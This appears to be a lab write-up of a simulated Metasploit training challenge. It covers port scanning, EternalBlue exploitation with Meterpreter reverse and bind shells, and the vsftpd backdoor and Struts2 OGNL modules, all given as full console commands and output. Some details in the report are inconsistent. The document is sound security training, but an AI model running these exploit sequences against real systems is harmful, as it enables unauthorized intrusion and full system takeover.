# Hub Challenge 1 – Metasploit Framework
## 1. Background

The Metasploit Framework is a widely used cybersecurity tool that helps security professionals find and test weaknesses in computer systems. It provides a collection of modules that allow users to scan for vulnerabilities, run controlled exploits, and assess how attackers might compromise a system.

After a successful exploit, the framework can deploy payloads such as Meterpreter, which gives an interactive session on the target machine for further investigation or testing.

In simple terms, Metasploit allows security testers to simulate real-world attacks in a safe and authorized environment so that organizations can discover and fix security weaknesses before malicious attackers exploit them.

The Metasploit Framework hub introduced the practical use of one of the most widely used penetration testing platforms for vulnerability exploitation and security assessment. The framework provides a modular environment where security professionals can discover vulnerabilities, execute exploits, deliver payloads, and perform post-exploitation activities on compromised systems. Through structured exercises in the lab environment, the challenge demonstrated how automated exploitation tools can simplify complex attacks while allowing analysts to understand the mechanics behind each stage of the attack lifecycle.

## 2. Objectives

- The objective of this challenge was to develop foundational skills in operating the Metasploit Framework.
- The tasks focused on learning how to navigate the Metasploit console, execute auxiliary modules for reconnaissance, launch exploits against vulnerable systems, and establish advanced payloads such as Meterpreter for post-exploitation interaction.

## 3. Scope and Limitations
### Scope

The activities performed in this lab were limited to the Metasploit section of Hub 1 and focused on the following tasks:

1. Basic Metasploit Commands

2. Running an Auxiliary Module

3. Exploiting a target using a Meterpreter Payload

These tasks were designed to introduce exploitation workflows and demonstrate the structure of the Metasploit environment.

### Limitations

- Activities were restricted to the controlled training lab - environment.

- Only the specified Metasploit tasks were performed.

- No external targets or networks were scanned or exploited.

- Advanced exploitation techniques outside the module scope were not executed to avoid knowledge gaps in the training sequence.

## 4. Legal and Ethical Disclaimer

1. All actions performed in this lab occurred within a controlled training environment designed for cybersecurity education.
2. The techniques demonstrated—including exploitation and remote payload execution—must only be used in authorized environments where explicit permission has been granted.
3. Unauthorized use of these techniques against systems, networks, or organizations is illegal and violates ethical cybersecurity standards.
## 5. Lab Initialization and Access
To begin the practical, the lab was confirmed to be active and accessible:

1. The training-shell terminal was launched and **`Hub 1`** was started.
2. The running command was executed to validate that the environment was live: `running # expected output: hub-1 running`.
3. The browser was opened and the interface was accessed via `http://localhost`
4. Navigation proceeded to the Metasploit Framework section.
5. All the required tasks were initiated and completed.

## 6. Challenge Overview

The Metasploit section consisted of three practical exercises designed to introduce the core workflow of the framework;

1. **Basic Metasploit Commands**

    This task introduced the structure of the Metasploit console and demonstrated how to search for modules, configure parameters, and interact with the framework environment.

2. **Auxiliary Module**

    Auxiliary modules were used to perform reconnaissance or service interaction without directly exploiting a vulnerability. This task demonstrated how auxiliary tools support information gathering before exploitation.

3. **Exploit with Meterpreter Payload**
   
    The final task demonstrated how to execute an exploit module against a vulnerable system and deliver a Meterpreter payload. This allowed interactive post-exploitation command execution and system interaction on the compromised host

## 7. Tools Used
| Tool | Purpose |
|-----|-----|
| **Metasploit Framework (msfconsole)** | Primary exploitation framework used to run modules, launch exploits, and manage payload sessions |
| **Meterpreter** | Advanced payload used for interactive post-exploitation access |
| **Auxiliary Modules** | Used for reconnaissance and service interaction without exploiting vulnerabilities |
| **Kali Linux Terminal** | Execution environment for Metasploit commands |
| **Internal Network Range** | 192.168.56.100 – 105 |

## 8. Tasks Completed

### 8.1 Basic Metasploit Commands
**Purpose:** 

This task introduced the use of the Metasploit Framework console and demonstrated how to navigate its core commands to locate and load security testing modules. The activity focused on learning how to search for available modules, understand their categories, and select an appropriate auxiliary scanners within the framework to prepare for reconnaissance or vulnerability assessment tasks.
The folllowing steps were folowed to accomplish the task;
1. Open the linux terminal and type `msfconsole`
2. Press `enter` and wait for the console to launch
3. At the console terminal, type `help` to display available core commands.
4. Run search to display the available `search` synthax.
5. Run search with a auxiliary argument, i.e `search auxiliary`
6. Load an auxiliary module with the command synthax `use auxiliary <Module path>`

```bash
# Launching the Kali terminal simulation
pentester@kali-linux:~$ Welcome to the Kali Terminal Simulation!
Type help to see available commands.

# Starting the Metasploit Framework console
pentester@kali-linux:~$ msfconsole
Metasploit Framework Console
       =[ metasploit v6.3.0-dev ]      # Shows the installed version of Metasploit
msf6 >                                  # Metasploit interactive prompt

# Displaying available commands inside Metasploit with help command
msf6 > help
Core Commands:
  help          Display this help menu
  search        Search module names/descriptions
  use           Select a module by name
  set           Set a context-specific variable
  show options  Show available options for the current module
  run/exploit   Run the current module
  exit          Exit the console

# Attempting to run the search command without parameters
msf6 > search
Usage: search <term>                    # Metasploit requires a keyword to search for modules

# Searching for auxiliary modules
msf6 > search auxiliary
Matching Modules:                       # Metasploit displays available modules containing "auxiliary"
  auxiliary/scanner/portscan/tcp        # TCP port scanning module
  auxiliary/scanner/ftp/ftp_version     # Module used to identify FTP server versions
  auxiliary/scanner/http/http_version   # Module used to detect HTTP server versions
  auxiliary/scanner/ssh/ssh_version     # Module used to detect SSH service versions
  auxiliary/dos/tcp/synflood            # Module used to simulate a TCP SYN flood attack

# Attempting to load a module using an incomplete name
msf6 > use auxiliary
Module not found: auxiliary             # Metasploit requires the full module path

# Loading the correct auxiliary module
msf6 > use auxiliary/scanner/portscan/tcp
Loaded module: auxiliary/scanner/portscan/tcp   # TCP port scanner module successfully loaded
```

### 8.2 Run an Auxiliary Module
**Purpose:** 
Auxiliary modules are mainly used during the reconnaissance and scanning stages of penetration testing. They help security testers collect information about a target system before attempting exploitation, making them an important step in understanding the attack surface.

**Prerequisites:**

- The task involved scanning the `internal network range 192.168.56.100–105` to identify hosts with open FTP, SSH, and SMB services.

- An auxiliary TCP port scanning module was used to enumerate the network by setting the target hosts and required options.

- The module was then executed to detect open ports and determine which systems were running the specified services.

**Steps Followed for TCP scan**

1. Launched the Metasploit console using `msfconsole`

2. Searched for auxiliary modules using `search auxiliary`

3. Loaded the TCP port scanning module using `use auxiliary/scanner/portscan/tcp`

4. Set the target host range using `set RHOSTS 192.168.56.100-105`

5. Specified the ports to scan using `set PORTS 21,22,445`

6. Configured the scanning threads using `set THREADS 50`

7. Executed the scan using the `run` command.

8. Reviewed the scan results for open ports on the target hosts as presented below:

```bash
# Searching for auxiliary modules inside Metasploit
msf6 > search auxiliary
Matching Modules:
  auxiliary/scanner/portscan/tcp        # Module used to scan hosts for open TCP ports
  auxiliary/scanner/ftp/ftp_version     # Module used to detect FTP server versions
  auxiliary/scanner/http/http_version   # Module used to identify HTTP server versions
  auxiliary/scanner/ssh/ssh_version     # Module used to detect SSH service versions
  auxiliary/dos/tcp/synflood            # Module used to simulate a TCP SYN flood DoS attack

# Loading the TCP port scanning module
msf6 > use auxiliary/scanner/portscan/tcp
Loaded module: auxiliary/scanner/portscan/tcp   # The selected auxiliary scanner is now active

# Attempting to set a single host variable incorrectly
msf6 > set RHOST 192.168.56.100-105
Unknown option: RHOST                        # The module does not recognize RHOST; it requires RHOSTS

# Setting the correct target host range
msf6 > set RHOSTS 192.168.56.100-105
Set RHOSTS => 192.168.56.100-105             # Defines the range of target IP addresses to scan

# Defining the ports to scan
msf6 > set PORTS 21,22,445
Set PORTS => 21,22,445                       # Specifies FTP (21), SSH (22), and SMB (445) ports for scanning

# Setting the number of scanning threads
msf6 > set THREADS 50
Set THREADS => 50                            # Allows faster scanning by using 50 concurrent threads

# Running the auxiliary port scan module
msf6 > run

[*] 192.168.56.100: - Scanned 1 of 1 hosts (100% complete)
# No open ports were detected on this host for the specified ports

[+] 192.168.56.101: - 192.168.56.101:22 - TCP OPEN
# SSH service detected on port 22

[*] 192.168.56.101: - Scanned 1 of 1 hosts (100% complete)

[+] 192.168.56.102: - 192.168.56.102:21 - TCP OPEN
# FTP service detected on port 21

[*] 192.168.56.102: - Scanned 1 of 1 hosts (100% complete)

[+] 192.168.56.103: - 192.168.56.103:445 - TCP OPEN
# SMB service detected on port 445, commonly used by Windows file sharing

[*] 192.168.56.103: - Scanned 1 of 1 hosts (100% complete)

[*] 192.168.56.104: - Scanned 1 of 1 hosts (100% complete)
# No specified ports were open on this host

[*] 192.168.56.105: - Scanned 1 of 1 hosts (100% complete)
# No specified ports were open on this host

[*] Auxiliary module execution completed
# The port scanning task finished successfully
```

**Steps Followed for FTP scan**

1. Searched for available auxiliary modules using search auxiliary.
2. Selected the FTP version scanning module using use auxiliary/scanner/ftp/ftp_version.
3. Set the target host range using set RHOSTS 192.168.56.100-105.
4. Executed the module using the run command to check for FTP services on the target hosts.
5. Reviewed the results returned by the moduleas presented below:

```bash
# Searching for auxiliary modules
msf6 > search auxiliary
Matching Modules:
  auxiliary/scanner/portscan/tcp
  auxiliary/scanner/ftp/ftp_version
  auxiliary/scanner/http/http_version
  auxiliary/scanner/ssh/ssh_version
  auxiliary/dos/tcp/synflood
# Metasploit displays available auxiliary modules for scanning and service interaction.

# Loading the FTP version scanner module
msf6 > use auxiliary/scanner/ftp/ftp_version
Loaded module: auxiliary/scanner/ftp/ftp_version
# The FTP version detection module is successfully selected.

# Setting the target hosts
msf6 > set RHOSTS 192.168.56.100-105
Set RHOSTS => 192.168.56.100-105
# The IP address range to be scanned for FTP services is defined.
# Running the modulemsf6 > run
No FTP service detected or connection failed.

# The scan did not detect any FTP services on the specified hosts, or the connection to the service failed.
```

### 8.3 Exploit with Meterpreter Payload
**Purpose:** Exploit modules are primarily used in the exploitation stage of penetration testing, where identified weaknesses are actively leveraged to confirm their impact. An exploit module serves as the entry point into a system, allowing a tester to move from identifying a vulnerability to actually gaining access and control. An exploit module targets specific vulnerabilities in software or services, executes malicious code on the vulnerable system, delivers a payload such as Meterpreter after successful exploitation, and establishes initial access to the target system.

**Goal:** The goal of this lab was to use the eternalblue exploit to attack a system and deliver a shell payload to establish an active remote shell access to the compromised system.

**Prerequisites:** Information gathered from 8.2 Auxiliary Module, will be used to launch the meterpreter payload attack. Hence the network range for the activity is 192.168.56.100-105.

**Steps Followed:**

The steps below are the general synthax followed to execute the exploit with meterpreter payload challenge.
1. Viewed available Metasploit commands with **`help`** command
2. Selected and loaded an appropriate exploit module with the command `use <exploit_module>`
3. Checked the required configuration options for the module with the command `show options`
4. Set the target system address with the command `set RHOST <target_ip>`
5. Configured a suitable payload `set PAYLOAD <payload_name>`
6. Executed the exploit `run` or `exploit`
7. Observed the outcome of the attempt
8. (Review output in the console)
9. Modified the payload configuration and repeated the process
   - set PAYLOAD <alternative_payload>
10. Re-ran the exploit and reviewed the results `run` or `exploit`


**Terminal Outputs**

```bash
msf6 > help
Core Commands:
  help        Display this help menu
  search      Search module names/descriptions
  use         Select a module by name
  set         Set a context-specific variable
  show options  Show available options for the current module
  run/exploit Run the current module
  exit        Exit the console
msf6 > use exploit/windows/smb/ms17_010_eternalblue
Loaded module: exploit/windows/smb/ms17_010_eternalblue
msf6 > show options
Module options:
  RHOST (required)
  PAYLOAD (required)
msf6 > set RHOST 192.168.56.101
Set RHOST => 192.168.56.101
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
Set PAYLOAD => windows/meterpreter/reverse_tcp
msf6 > run
Exploit failed: Target not vulnerable or not found.

```

- Conclusion: The exploitation attempt using the selected Metasploit module was unsuccessful. This could be an indicator that the target system was either not vulnerable to the specified exploit or not properly configured to respond to the attack.


```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
Loaded module: exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOST 192.168.56.102
Set RHOST => 192.168.56.102
msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
Set PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf6 > run
Exploit failed: Target not vulnerable or not found.

-----------------------------------------------------------
msf6 > use exploit/windows/smb/ms17_010_eternalblue
Loaded module: exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOST 192.168.56.102
Set RHOST => 192.168.56.102
msf6 > set PAYLOAD windows/meterpreter/bind_tcp
Set PAYLOAD => windows/meterpreter/bind_tcp
msf6 > run
Exploit failed: Target not vulnerable or not found.
```

- Conclusion: The exploitation attempt using the selected Metasploit module was unsuccessful. This could be an indicator that the target system was either not vulnerable to the specified exploit or not properly configured to respond to the attack.

**Fixing the Error:**

The SMB exploitation attempts failed because the selected target IP addresses did not meet the necessary conditions required for the EternalBlue (MS17-010) exploit to succeed. Analysis of the earlier auxiliary scan results confirmed that port 445 (SMB) was not open on 192.168.56.100, 192.168.56.101, and 192.168.56.102, making them unsuitable targets. Instead, port 22 (SSH) was open on 192.168.56.101 and port 21 (FTP) on 192.168.56.102, while only 192.168.56.103 had port 445 (SMB) open, indicating it as the valid candidate for SMB-based exploitation.

For the EternalBlue exploit to work, several key criteria must be satisfied: the target system must have SMB service running on port 445, must be a vulnerable Windows system that has not been patched against MS17-010, and must be reachable over the network. Additionally, the correct payload compatible with the target operating system must be selected. Failure to meet any of these conditions results in unsuccessful exploitation, as observed.

This outcome reinforces the importance of accurate reconnaissance and service enumeration before attempting exploitation, ensuring that the chosen exploit aligns with the target’s exposed services and underlying vulnerabilities.

**Fix 1: Reverse TCP payload on 192.168.56.103**
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
Loaded module: exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOST 192.168.56.103
Set RHOST => 192.168.56.103
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
Set PAYLOAD => windows/meterpreter/reverse_tcp
[*] 192.168.56.103:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.56.103:445 - Host is likely VULNERABLE to MS17-010!
[*] 192.168.56.103:445 - Connecting to target for exploitation.
[+] 192.168.56.103:445 - Connection established for exploitation.
[*] 192.168.56.103:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.56.103:445 - CORE raw buffer dump (42 bytes)
[*] 192.168.56.103:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.56.103:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.56.103:445 - Sending all but last fragment of exploit packet
[*] 192.168.56.103:445 - Starting non-paged pool grooming
[*] 192.168.56.103:445 - Sending SMBv2 buffers
[*] 192.168.56.103:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.56.103:445 - Sending final SMBv2 buffers.
[*] 192.168.56.103:445 - Sending last fragment of exploit packet!
[*] 192.168.56.103:445 - Receiving response from exploit packet
[+] 192.168.56.103:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.56.103:445 - Sending egg to corrupted connection.
[*] 192.168.56.103:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 192.168.56.103
[*] Meterpreter session 1 opened (192.168.56.200:4444 -> 192.168.56.103:49218)
[*] ================= WIN ==============================
meterpreter >
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
meterpreter > shell
Unknown command: shell
meterpreter >
meterpreter > ps
Unknown command: ps
meterpreter >
meterpreter > sysinfo
Unknown command: sysinfo
meterpreter >
meterpreter >
meterpreter > exit
Session closed. Returning to msfconsole.
```


**Fix 2: Bind TCP payload on 192.168.56.103**

```bash
msf6 > search exploit
Matching Modules:
  exploit/windows/smb/ms17_010_eternalblue
  exploit/unix/ftp/vsftpd_234_backdoor
  exploit/multi/http/struts2_content_type_ognl
msf6 > use exploit/windows/smb/ms17_010_eternalblue
Loaded module: exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOST 192.168.56.103
Set RHOST => 192.168.56.103
msf6 > set PAYLOAD windows/meterpreter/bind_tcp
Set PAYLOAD => windows/meterpreter/bind_tcp
[*] 192.168.56.103:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[*] 192.168.56.103:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.56.103:445 - Host is likely VULNERABLE to MS17-010!
[*] 192.168.56.103:445 - Connecting to target for exploitation.
[+] 192.168.56.103:445 - Connection established for exploitation.
[*] 192.168.56.103:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.56.103:445 - CORE raw buffer dump (42 bytes)
[*] 192.168.56.103:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.56.103:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.56.103:445 - Sending all but last fragment of exploit packet
[*] 192.168.56.103:445 - Starting non-paged pool grooming
[*] 192.168.56.103:445 - Sending SMBv2 buffers
[*] 192.168.56.103:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.56.103:445 - Sending final SMBv2 buffers.
[*] 192.168.56.103:445 - Sending last fragment of exploit packet!
[*] 192.168.56.103:445 - Receiving response from exploit packet
[+] 192.168.56.103:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.56.103:445 - Sending egg to corrupted connection.
[*] 192.168.56.103:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 192.168.56.103
[*] Meterpreter session 1 opened (192.168.56.200:4444 -> 192.168.56.103:49218)
[*] ================= WIN ==============================
meterpreter >
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
meterpreter > exit
Session closed. Returning to msfconsole.
```

- Conclusion:
  The exploitation process using the EternalBlue (MS17-010) module was successful against the target system 192.168.56.103, confirming that the host met all required criteria for the attack. The system had port 445 (SMB) open, was vulnerable to MS17-010, and allowed a successful connection and payload delivery. The exploit execution progressed through all stages, including vulnerability verification, buffer manipulation, and payload injection, ultimately resulting in a Meterpreter session being established.
  
  The Meterpreter session provided high-level access, as evidenced by the system privileges returned (NT AUTHORITY\SYSTEM), indicating complete control over the compromised machine. However, some Meterpreter commands such as `shell`, `ps`, and `sysinfo` were not recognized, suggesting limitations within the simulated environment or restrictions on the payload functionality.

**Fix 3: vsftpd_234_backdoor Exploit with Reverse TCP payload on 192.168.56.102**

```bash
msf6 > search exploit
Matching Modules:
  exploit/windows/smb/ms17_010_eternalblue
  exploit/unix/ftp/vsftpd_234_backdoor
  exploit/multi/http/struts2_content_type_ognl
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
Loaded module: exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOST 192.168.56.102
Set RHOST => 192.168.56.102
msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
Set PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf6 > run
Exploit sent. (Simulated output)
Backdoor shell opened! (Simulated)
msf6 >
```

**Fix 4: struts2_content_type_ognl Exploit with Reverse TCP payload on 192.168.56.101**
```bash
pentester@kali-linux:~$ msfconsole
Metasploit Framework Console
       =[ metasploit v6.3.0-dev ]
msf6 >
msf6 > search exploit
Matching Modules:
  exploit/windows/smb/ms17_010_eternalblue
  exploit/unix/ftp/vsftpd_234_backdoor
  exploit/multi/http/struts2_content_type_ognl
msf6 > use exploit/multi/http/struts2_content_type_ognl
Loaded module: exploit/multi/http/struts2_content_type_ognl
msf6 > set RHOST 192.168.56.101
Set RHOST => 192.168.56.101
msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
Set PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf6 > run
Exploit sent. (Simulated output)
Remote code execution achieved! (Simulated)
```
- Conclusion: The exploitation exercises demonstrated successful targeting of both FTP and web application vulnerabilities by correctly aligning reconnaissance findings with appropriate exploit modules.

  The vsftpd 2.3.4 backdoor exploit successfully compromised the FTP service on 192.168.56.102, resulting in a simulated backdoor shell, while the Apache Struts2 Content-Type OGNL injection exploit achieved remote code execution on 192.168.56.101 through a vulnerable web application. In both cases, the use of Meterpreter reverse TCP payloads enabled simulated remote access, illustrating how different services can be exploited using tailored techniques. 

  Overall, the results reinforced the importance of accurate service identification, proper exploit selection, and understanding how vulnerabilities across multiple attack surfaces—such as FTP and HTTP—can be leveraged to gain unauthorized access.

## 9. Key Findings Table

| Tool Used              | Technique Type              | Command(s) Executed                                                                 | Key Output / Observed Result                                                                 | Insight Gained                                                                 | Risk Level | Lessons Learned                                                                 | Recommended Action / Mitigation                                              | Conclusion                                                                                  |
|-----------------------|----------------------------|--------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------|------------|----------------------------------------------------------------------------------|-------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|
| Metasploit Framework  | Reconnaissance / Auxiliary Scan | search auxiliary; use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.56.100-105; set PORTS 21,22,445; set THREADS 50; run | Open ports detected: 192.168.56.101:22 (SSH), 192.168.56.102:21 (FTP), 192.168.56.103:445 (SMB) | Scanning accurately identifies active services across hosts                   | Medium     | Proper module usage and configuration are essential                              | Perform thorough scanning before exploitation                                 | Enabled correct mapping of services to targets for further exploitation                     |
| Metasploit Framework  | Service Enumeration         | use auxiliary/scanner/ftp/ftp_version; set RHOSTS 192.168.56.100-105; run           | No FTP service detected or connection failed                                                 | Not all open ports guarantee successful enumeration                           | Low        | Service accessibility and compatibility must be verified                         | Validate service configuration and availability                               | Highlighted limitations of enumeration tools and need for verification                      |
| Metasploit Framework  | Exploit / SMB Vulnerability | use exploit/windows/smb/ms17_010_eternalblue; set RHOST <target>; set PAYLOAD windows/meterpreter/reverse_tcp; run | Exploit failed on 192.168.56.100 and 192.168.56.101                                         | Exploits require correct service and vulnerability alignment                  | High       | Reconnaissance must guide exploitation                                            | Confirm vulnerability before launching exploit                                | Demonstrated failure when targeting incorrect hosts                                          |
| Metasploit Framework  | Exploit / SMB Vulnerability | use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.56.103; set PAYLOAD windows/meterpreter/reverse_tcp; run | Meterpreter session opened; NT AUTHORITY\SYSTEM                                             | Successful exploitation leads to full system compromise                        | Critical   | Correct target and payload selection is key                                      | Patch SMB vulnerabilities; restrict port 445                                  | Confirmed successful exploitation and privilege escalation                                   |
| Metasploit Framework  | Exploit / SMB Vulnerability | use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.56.103; set PAYLOAD windows/meterpreter/bind_tcp; run | Meterpreter session opened via bind TCP                                                     | Multiple payloads can achieve similar outcomes                                | Critical   | Payload choice depends on network conditions                                     | Enforce firewall rules and restrict SMB access                                | Demonstrated flexibility of payload selection and exploitation success                      |
| Metasploit Framework  | Exploit / FTP Vulnerability | use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 192.168.56.102; set PAYLOAD linux/x86/meterpreter/reverse_tcp; run | Backdoor shell opened (simulated)                                                           | Vulnerable FTP services can allow unauthorized access                         | High       | Outdated or backdoored services are high risk                                    | Disable insecure FTP versions; patch systems                                  | Demonstrated successful exploitation of vulnerable FTP service                              |
| Metasploit Framework  | Exploit / Web Application   | use exploit/multi/http/struts2_content_type_ognl; set RHOST 192.168.56.101; set PAYLOAD linux/x86/meterpreter/reverse_tcp; run | Remote code execution achieved (simulated)                                                  | Web vulnerabilities can lead to full system compromise                        | High       | Web application security is critical                                             | Patch frameworks; implement input validation and WAF                          | Demonstrated risk and impact of web-based exploitation                                       |


## 10. Troubleshooting
When commands failed or services did not respond:

- The current shell was validated using the command `echo $SHELL`
- If incorrect, the **start_script.sh** was re-run
- The lab state was verified again using `running`

This ensured tool execution remained within the designated training environment.

## 11. Summary and Lesson Learnt
### Summary

The assessment demonstrated a complete penetration testing workflow using the Metasploit Framework, beginning with reconnaissance and progressing through enumeration to exploitation. Network scanning successfully identified active services across multiple hosts, including SSH, FTP, and SMB, which guided the selection of appropriate exploit modules. Initial exploitation attempts failed where service–exploit alignment was incorrect, but subsequent targeting of the correct host and service—particularly the SMB service on port 445—resulted in successful system compromise with elevated privileges. Additional exploits against FTP and web application services further illustrated how different vulnerabilities across multiple attack surfaces can be leveraged to achieve unauthorized access.

### Lessons Learnt
- The exercise reinforced the critical importance of thorough reconnaissance and accurate service identification before attempting exploitation.
- Successful attacks depended heavily on matching the correct exploit to the appropriate service, operating system, and vulnerability.
- Misconfigurations, incorrect parameters, and assumptions about service availability led to failed attempts, highlighting the need for careful validation at each stage. 
- The results also emphasized the risks posed by unpatched systems, outdated services, and vulnerable web applications, as well as the flexibility of payload selection based on network conditions.
- Overall, the lab underscored that effective penetration testing requires a structured, methodical approach and a strong understanding of how different tools and techniques interconnect.

## 12. Conclusion

The lab exercise provided hands-on experience with the Metasploit Framework, demonstrating the full spectrum of penetration testing activities from reconnaissance to exploitation. By systematically scanning the network, identifying open ports and services, and applying targeted exploits, it highlighted the importance of accurate vulnerability assessment before attempting compromise. The results revealed that successful exploitation depends on matching the correct exploit to the appropriate host, service, and payload, while failed attempts reinforced the significance of verification and preparation. Overall, the lab emphasized the critical role of structured methodology, careful analysis, and strategic payload selection in cybersecurity testing, providing practical insights into real-world network vulnerabilities and the effectiveness of Metasploit as a penetration testing tool.
